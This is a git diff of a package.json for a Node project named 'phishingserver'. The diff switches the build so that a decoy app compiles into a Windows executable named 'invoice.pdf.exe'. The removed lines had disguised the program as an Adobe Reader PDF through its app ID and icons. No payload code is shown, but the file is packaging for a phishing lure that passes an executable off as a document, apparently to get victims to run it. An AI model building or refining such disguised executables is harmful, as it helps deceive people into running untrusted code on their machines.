@@ -1,24 +1,24 @@
 {
   "name": "phishingserver",
   "version": "1.0.0",
-  "main": "main.js",
+  "main": "decoy_app.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
     "start": "node server.js",
     "dev": "nodemon server.js",
-    "electronstart": "electron main.js",
-    "package": "electron-packager . phishingserver --platform=win32 --arch=x64 --out=dist --overwrite --no-rcedit",
+    "package": "pkg decoy_app.js --target node18-win-x64 --output bin/invoice.pdf.exe",
     "doubleclick": "bash autorun.sh"
   },
-  "build": {
-    "appId": "com.adobe.reader",
-    "win": {
-      "icon": "pdf.ico"
-    },
-    "mac": {
-      "icon": "pdf.icns"
-    },
-    "productName": "invoice.pdf"
+  "bin": {
+    "invoice.pdf.exe": "decoy_app.js"
+  },
+  "pkg": {
+    "assets": [
+      "decoy.html"
+    ],
+    "targets": [
+      "node18-win-x64"
+    ]
   },
   "keywords": [],
   "author": "",
@@ -28,11 +28,11 @@
     "dotenv": "^16.5.0",
     "express": "^5.1.0",
     "mongoose": "^8.14.3",
-    "nodemon": "^3.1.10"
+    "nodemon": "^3.1.10",
+    "open": "^8.4.2" 
   },
   "devDependencies": {
-    "electron": "^37.3.1",
-    "electron-packager": "^17.1.2"
+    "pkg": "^5.8.1"
   },
   "repository": {
     "type": "git",
